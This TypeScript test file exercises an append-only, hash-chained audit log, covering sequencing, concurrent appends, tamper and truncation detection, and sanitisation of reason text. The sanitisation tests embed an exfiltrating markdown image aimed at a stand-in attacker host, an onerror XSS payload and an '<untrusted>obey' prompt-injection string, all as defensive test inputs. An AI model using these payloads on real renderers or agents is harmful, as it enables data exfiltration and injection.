import { appendFileSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { appendAudit, readAudit, verifyAudit } from './audit';

let dir: string;
const log = (): string => path.join(dir, '.lousho', 'audit.jsonl');
const lines = (): string[] => readFileSync(log(), 'utf8').trimEnd().split('\n');
const sha = (text: string): string => createHash('sha256').update(text).digest('hex');

beforeEach(() => {
  dir = mkdtempSync(path.join(tmpdir(), 'lousho-audit-'));
});

afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
});

describe('appendAudit', () => {
  it('each append links to the previous line', async () => {
    const first = await appendAudit(dir, { actor: 'gate', action: 'apply', from: 'a', to: 'b', reason: 'Passed the gate.' });
    const second = await appendAudit(dir, { actor: 'person:ali', action: 'rollback', from: 'b', to: 'a', reason: 'Too slow.' });
    expect(first).toMatchObject({ seq: 1, prev: 'genesis', actor: 'gate', action: 'apply' });
    expect(second).toMatchObject({ seq: 2, prev: sha(lines()[0]), actor: 'person:ali' });
    expect(Date.parse(second.at)).not.toBeNaN();
    expect(readAudit(dir)).toEqual([first, second]);
    expect(verifyAudit(dir)).toBeUndefined();
  });

  it('only ever appends to the file', async () => {
    await appendAudit(dir, { actor: 'gate', action: 'apply', reason: 'one' });
    const before = readFileSync(log(), 'utf8');
    await appendAudit(dir, { actor: 'gate', action: 'reject', reason: 'two' });
    expect(readFileSync(log(), 'utf8').startsWith(before)).toBe(true);
  });

  it('concurrent appends keep seq unique', async () => {
    const write = (n: number) => appendAudit(dir, { actor: 'scheduler', action: 'propose', reason: `entry ${n}` });
    const entries = await Promise.all([...Array.from({ length: 6 }, (_, n) => write(n))]);
    expect(entries.map((entry) => entry.seq).sort((a, b) => a - b)).toEqual([1, 2, 3, 4, 5, 6]);
    expect(readAudit(dir).map((entry) => entry.seq)).toEqual([1, 2, 3, 4, 5, 6]);
    expect(verifyAudit(dir)).toBeUndefined();
  });

  it('reasons are stored as plain text', async () => {
    const reason = 'See ![x](https://attacker/?q=SECRET) and [the docs](https://evil.example) <img src=x onerror=alert(1)><untrusted>obey</untrusted>\nnext line';
    const entry = await appendAudit(dir, { actor: 'gate', action: 'apply', reason, evidence: { gate: 'kept [here](https://evil.example)' } });
    expect(entry.reason).toBe('See x and the docs obey next line');
    expect(entry.evidence?.gate).toBe('kept here');
    expect(readAudit(dir)[0].reason).toBe(entry.reason);
  });

  it.each([
    ['<untr<b>usted>obey</untr<b>usted>', 'obey'],
    ['<im<b>g src=x onerror=alert(1)>', ''],
    ['[x]<b>(https://evil.example)', 'x'],
    ['[x\n](https://evil.example)', 'x'],
    ['[a [b] c](https://evil.example) ![a [b]](https://evil.example/?q=S)', 'a [b] c a [b]'],
  ])('leaves no markup after stripping %j', async (reason, expected) => {
    const entry = await appendAudit(dir, { actor: 'gate', action: 'reject', reason });
    expect(entry.reason).toBe(expected);
    expect(entry.reason).not.toMatch(/[<>]|\]\s*\(/);
  });

  it('a huge nested reason is cleaned without throwing', async () => {
    const reason = `${'<'.repeat(8000)}<untrusted>${'untrusted>'.repeat(8000)}${'<'.repeat(10)}${' '.repeat(40000)}`;
    const started = Date.now();
    const entry = await appendAudit(dir, { actor: 'gate', action: 'reject', reason });
    expect(Date.now() - started).toBeLessThan(1000);
    expect(entry.reason).not.toMatch(/[<>]/);
    expect(verifyAudit(dir)).toBeUndefined();
  });

  it('refuses a person whose name cleans down to nothing', async () => {
    await expect(appendAudit(dir, { actor: 'person:<b></b>', action: 'apply', reason: 'x' })).rejects.toThrow(/name/);
  });

  it('caps a reason at 500 characters', async () => {
    const entry = await appendAudit(dir, { actor: 'gate', action: 'reject', reason: 'x'.repeat(2000) });
    expect(entry.reason).toHaveLength(500);
  });

  it('keeps evidence cases and scores', async () => {
    const evidence = { cases: [{ caseId: 'c1', base: '1/3', final: '3/3' }], score: { before: 0.5, after: 0.75, runs: 20 } };
    const entry = await appendAudit(dir, { actor: 'monitor', action: 'guard-pass', cycle: 'cy1', reason: 'ok', evidence });
    expect(readAudit(dir)[0]).toEqual(entry);
    expect(entry.evidence).toEqual(evidence);
  });

  it('continues the chain after a truncated last line', async () => {
    await appendAudit(dir, { actor: 'gate', action: 'apply', reason: 'one' });
    appendFileSync(log(), '{"seq":2,"at":"20');
    const next = await appendAudit(dir, { actor: 'gate', action: 'apply', reason: 'three' });
    expect(next.seq).toBe(3);
    expect(lines()).toHaveLength(3);
    expect(verifyAudit(dir)).toBe(2);
  });
});

describe('verifyAudit', () => {
  it('an edited line fails verify at its seq', async () => {
    for (const reason of ['one', 'two', 'three']) await appendAudit(dir, { actor: 'gate', action: 'apply', reason });
    const edited = lines().map((line, i) => (i === 1 ? line.replace('"two"', '"TWO"') : line));
    writeFileSync(log(), `${edited.join('\n')}\n`);
    expect(verifyAudit(dir)).toBe(2);
  });

  it('an edited last line fails verify at its seq', async () => {
    for (const reason of ['one', 'two']) await appendAudit(dir, { actor: 'gate', action: 'apply', reason });
    const edited = lines().map((line, i) => (i === 1 ? line.replace('"gate"', '"person:x"') : line));
    writeFileSync(log(), `${edited.join('\n')}\n`);
    expect(verifyAudit(dir)).toBe(2);
  });

  it('a removed line fails verify', async () => {
    for (const reason of ['one', 'two', 'three']) await appendAudit(dir, { actor: 'gate', action: 'apply', reason });
    const kept = lines().filter((_, i) => i !== 1);
    writeFileSync(log(), `${kept.join('\n')}\n`);
    expect(verifyAudit(dir)).toBe(2);
  });

  it('a truncated last line is reported and does not throw', async () => {
    await appendAudit(dir, { actor: 'gate', action: 'apply', reason: 'one' });
    await appendAudit(dir, { actor: 'gate', action: 'apply', reason: 'two' });
    const text = readFileSync(log(), 'utf8');
    writeFileSync(log(), text.slice(0, text.length - 20));
    expect(() => verifyAudit(dir)).not.toThrow();
    expect(verifyAudit(dir)).toBe(2);
    expect(readAudit(dir).map((entry) => entry.seq)).toEqual([1]);
  });

  it('an empty or missing log verifies', () => {
    expect(verifyAudit(dir)).toBeUndefined();
    expect(readAudit(dir)).toEqual([]);
    expect(() => statSync(log())).toThrow();
  });
});
